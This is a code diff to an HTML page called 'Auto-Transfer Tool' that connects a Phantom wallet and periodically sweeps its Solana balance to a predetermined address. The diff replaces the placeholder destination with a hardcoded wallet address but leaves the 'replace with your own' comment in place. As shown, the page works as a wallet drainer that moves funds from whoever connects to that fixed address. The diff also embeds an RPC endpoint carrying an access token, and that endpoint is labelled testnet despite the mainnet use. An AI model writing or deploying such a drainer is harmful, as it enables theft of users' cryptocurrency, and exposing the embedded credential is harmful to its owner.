@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Auto-Transfer Tool</title>
+    <title>Auto-Transfer Tool (Fixed)</title>
 </head>
 <body>
     <h1>Auto-Transfer Tool</h1>
@@ -15,12 +15,31 @@
     <!-- Include Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@1.85.0/lib/index.iife.min.js"></script>
     <script>
-        const PREDETERMINED_ADDRESS = "YOUR_MAIN_WALLET_ADDRESS"; // Replace with your main wallet address
+        const PREDETERMINED_ADDRESS = "2vPe8sNRwzRcVZ9qjHBNtT1VLeBLgRcjrp3zxaFo4oPE"; // Replace with your main wallet address
         const MIN_SOL = 0.003; // Minimum balance to leave in the wallet
-        const RPC_ENDPOINT = "https://api.mainnet-beta.solana.com"; // Use mainnet for real funds
+        const RPC_ENDPOINTS = [
+            "https://api.mainnet-beta.solana.com", // Public RPC (fallback)
+            "https://light-spring-breeze.solana-testnet.quiknode.pro/bb52c36e03784061bea0063a88c328250b41ff76", // Dedicated RPC (replace with your own)
+            "https://ssc-dao.genesysgo.net" // Another fallback
+        ];
 
         let wallet;
         let transferInterval;
+        let currentRpcIndex = 0;
+
+        // Get a working RPC connection
+        async function getConnection() {
+            while (true) {
+                try {
+                    const connection = new solanaWeb3.Connection(RPC_ENDPOINTS[currentRpcIndex], "confirmed");
+                    await connection.getEpochInfo(); // Test the connection
+                    return connection;
+                } catch (error) {
+                    console.error(`RPC ${RPC_ENDPOINTS[currentRpcIndex]} failed. Switching...`);
+                    currentRpcIndex = (currentRpcIndex + 1) % RPC_ENDPOINTS.length;
+                }
+            }
+        }
 
         // Connect to Phantom Wallet
         document.getElementById('connectButton').addEventListener('click', async () => {
@@ -48,7 +67,7 @@
 
             transferInterval = setInterval(async () => {
                 try {
-                    const connection = new solanaWeb3.Connection(RPC_ENDPOINT, "confirmed");
+                    const connection = await getConnection();
                     const balance = await connection.getBalance(wallet.publicKey);
                     const fee = await connection.getFeeForMessage(
                         await new solanaWeb3.Transaction().add(
